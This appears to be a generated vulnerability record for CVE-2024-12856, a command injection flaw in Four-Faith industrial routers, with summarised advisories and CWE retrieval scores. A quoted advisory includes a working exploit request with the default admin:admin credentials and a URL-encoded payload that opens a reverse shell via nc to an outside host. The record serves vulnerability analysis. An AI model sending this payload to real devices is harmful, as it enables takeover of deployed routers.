# Vulnerability Information: CVE-2024-12856

## Vulnerability Description
The Four-Faith router models F3x24 and F3x36 are affected by an operating system (OS) **command injection vulnerability**. At least firmware version 2.0 allows authenticated and remote attackers to execute arbitrary OS commands over HTTP when modifying the system time via apply.cgi. Additionally, this firmware version has **default credentials** which, if not changed, would effectively change this vulnerability into an unauthenticated and remote OS command execution issue.

### Vulnerability Description Key Phrases
- **rootcause:** **default credentials**
- **weakness:** **command injection vulnerability**
- **impact:** execute arbitrary OS commands and command execution
- **vector:** modify system time via apply.cgi
- **attacker:** remote attackers and authenticated
- **product:** 'F3x36'] and ['F3x24'
- **version:** at least firmware version 2.0
- **component:** apply.cgi

## CVE Reference Links Content Summary
```
{
  "guidelines": "1. First verify if the content relates to the CVE specified based on the official description\n2. If the content does not relate to this CVE, respond with \"UNRELATED\"\n3. If no useful vulnerability information is found, respond with \"NOINFO\" \n4. For relevant content, extract:\n   - Root cause of vulnerability\n   - Weaknesses/vulnerabilities present\n   - Impact of exploitation\n   - Attack vectors\n   - Required attacker capabilities/position\n\nAdditional instructions:\n- Preserve original technical details and descriptions\n- Remove unrelated content\n- Translate non-English content to English\n- Note if the content provides more detail than the official CVE description",
  "response": {
    "CVE-2024-12856": [
      {
        "content": "## Four-Faith Industrial Router CVE-2024-12856 Exploited in the Wild\n\nVulnCheck observed a new post-authentication vulnerability affecting Four-Faith industrial routers being exploited in the wild. The attacker leveraged the router‚Äôs default credentials, effectively resulting in unauthenticated remote command injection. VulnCheck has assigned this issue [CVE-2024-12856](https://api.vulncheck.com/v3/index/vulncheck-kev?cve=CVE-2024-12856).\n\nThe attack can be conducted against, at least, the Four-Faith F3x24 and F3x36 over HTTP using the `/apply.cgi` endpoint. The systems are vulnerable to OS command injection in the `adj_time_year` parameter when modifying the device‚Äôs system time via `submit_type=adjust_sys_time`.\n\nThe following POST request demonstrates exploitation for a reverse shell.\n\n```\nPOST /apply.cgi HTTP/1.1\nHost: 192.168.1.1:90\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\nContent-Length: 296\nAuthorization: Basic YWRtaW46YWRtaW4=\nContent-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip\nadj_time_sec=32&change_action=gozila_cgi&adj_time_day=27&adj_time_mon=10&adj_time_hour=11&adj_time_year=%24%28cd+%2Ftmp%2F%3B+mknod+bOY+p%3Bcat+bOY%7C%2Fbin%2Fsh+-i+2%3E%261%7Cnc+192.168.1.206+1270+%3EbOY%3B+rm+bOY%3B%29&adj_time_min=35&submit_button=index&action=Save&submit_type=adjust_sys_time\n```\n\nOn the device, the result of the injection can be observed using `ps`:\n\n```\n20938 admin     1640 S    sh -c rtc_tm ss $(cd /tmp/; mknod WaO p;cat WaO|/bin\n20940 admin     1640 S    sh -c rtc_tm ss $(cd /tmp/; mknod WaO p;cat WaO|/bin\n20942 admin     1636 S    cat WaO\n20943 admin     1636 S    /bin/sh -i\n20945 admin     1636 S    nc 192.168.1.206 1270\n```\n\n",
        "root_cause": "The vulnerability lies in the `adj_time_year` parameter within the `/apply.cgi` endpoint of Four-Faith routers. This parameter is vulnerable to OS command injection when modifying the device's system time.",
        "weaknesses": [
          "OS command injection",
          "Lack of input sanitization"
        ],
        "impact": "Successful exploitation allows an attacker to execute arbitrary OS commands on the vulnerable router, potentially leading to complete compromise of the device. The provided example shows how to get a reverse shell.",
        "attack_vectors": "The vulnerability is accessible over HTTP via the `/apply.cgi` endpoint. Attackers can exploit the vulnerability by sending a crafted POST request that includes the command injection payload in the `adj_time_year` parameter when `submit_type=adjust_sys_time`.",
         "required_capabilities": "The attacker needs to know or guess the router's default credentials (admin:admin) and be able to send HTTP requests to the vulnerable device."
      },
      {
        "content": "Four-Faith Industrial Router Authenticated Command Injection\n\nseverityhighdateDecember 27, 2024Affecting\n\n*   Four-Faith F3x24\n*   Four-Faith F3x36\n\nCVECVE-2024-12856CVE typeImproper AuthorizationCVSS7.2CVSS V3 VectorAV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:HReferences\n\n*   [Exploit](https://vulncheck.com/blog/four-faith-cve-2024-12856)\n*   [Exploit](https://ducklingstudio.blog.fc2.com/blog-entry-392.html)",
         "root_cause": "The vulnerability is due to improper authorization, which leads to authenticated command injection.",
        "weaknesses": [
          "Improper Authorization",
          "OS command injection"
        ],
        "impact": "An attacker with high privileges (which can be bypassed using default credentials) can execute arbitrary commands on the affected devices.",
        "attack_vectors": "The vulnerability can be exploited by sending a malicious request to the device, leveraging the improper authorization.",
        "required_capabilities": "The attacker needs high privileges (default credentials)."
      },
      {
        "content": "## CVE-2024-12856\n\nüóìÔ∏è¬†27 Dec 2024¬†16:23:15Reported by¬†[VulnCheck](/search?query=reporter:\"VulnCheck\")Type¬†![cve](/static/img/cve.webp)¬†[cve](/search?query=type:cve)üîó¬†[web.nvd.nist.gov](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2024-12856)üëÅ¬†90¬†Views\n\nFour-Faith routers vulnerable to OS command injection with default credentials issues in firmware version 2.0.",
        "root_cause": "The vulnerability is due to OS command injection in Four-Faith routers.",
        "weaknesses": [
          "OS command injection",
          "Use of default credentials"
        ],
        "impact": "Attackers can execute arbitrary commands on the device.",
         "attack_vectors": "The vulnerability can be exploited using the default credentials of the routers.",
        "required_capabilities": "The attacker needs to know or guess the default credentials."
      }
    ]
  }
}
```

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | Class | Allowed-with-Review | alternate_terms | 0.800 |
| 2 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | sparse | 0.393 |
| 3 | 138 | Improper Neutralization of Special Elements | Class | Discouraged | sparse | 0.362 |
| 4 | 798 | Use of Hard-coded Credentials | Base | Allowed | sparse | 0.360 |
| 5 | 321 | Use of Hard-coded Cryptographic Key | Variant | Allowed | sparse | 0.350 |
| 6 | 22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Base | Allowed | sparse | 0.349 |
| 7 | 287 | Improper Authentication | Class | Discouraged | sparse | 0.338 |
| 8 | 20 | Improper Input Validation | Class | Discouraged | sparse | 0.335 |
| 9 | 259 | Use of Hard-coded Password | Variant | Allowed | dense | 0.581 |
| 10 | 184 | Incomplete List of Disallowed Inputs | Base | Allowed | graph | 0.002 |

